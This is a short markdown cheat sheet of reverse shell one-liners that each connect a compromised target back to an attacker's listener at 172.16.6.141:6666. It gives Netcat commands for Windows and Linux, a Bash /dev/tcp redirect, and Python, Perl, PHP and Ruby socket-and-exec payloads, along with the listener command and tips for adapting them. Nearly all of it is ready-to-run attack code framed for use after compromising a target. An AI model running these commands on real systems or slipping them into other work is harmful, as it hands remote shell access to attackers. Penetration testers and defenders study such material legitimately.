# Reverse shell commands

The adversary will run a listener on their machine and initiates the connection by running a command on the target machine that will connect back to the listener that the attacker is running.

The following examples assume the adversary IP is `172.16.6.141` and port `6666` is used for the connection.
In all of these cases, listen for port `6666` using the following Netcat command: `nc -vv -l -p 6666`

## Netcat reverse shell

Launching command prompts or cli to be able to execute commands from the hacking machine:

Windows - :

    nc 172.16.6.141 6666 -e cmd.exe

Linux:

    nc 172.16.6.141 6666 -e /bin/bash

`/bin/sh` can also be used.

## Bash reverse shell

Once the target is compromised, try launching a Bash reverse shell using:

    bash -i >& /dev/tcp/172.16.6.141/6666 0>&1

## Python reverse shell

Python is one of the most popular scripting languages and comes preinstalled on most Linux distributions. If the 
successfully compromised target is a Linux system, create a Python reverse shell:

    python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); v_ip="172.16.6.141"; s.connect((v_ip,6666)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); v_shell_path="/usr/bin/bash";v_shell_value="-i"; p=subprocess.call([v_shell_path,v_shell_value]);'

Replace the `v_ip` and `v_shell_path` values. The `v_ip` is the IP of the attacking machine (Kali Linux) and 
the `v_shell_path` is the path to the Bash shell of the target machine. 
Some systems use `/bin/bash` while others use `/usr/bin/bash`. To get the path of the Bash shell:

    which bash

## Perl reverse shell

If the target machine has Perl installed, create a reverse shell and connect to the target from the attacking machine
with:

    perl -e 'use Socket; $i="172.16.6.141";$p=6666; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/usr/bin/bash -i");};'

## PHP reverse shell

If the target has PHP installed, create a Reverse shell with:

    php -r '$sock=fsockopen("172.16.6.141",6666);exec("/bin/sh -i <&3 >&3 2>&3");'

## Ruby reverse shell

    ruby -rsocket -e'f=TCPSocket.open("172.16.6.141",6666).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
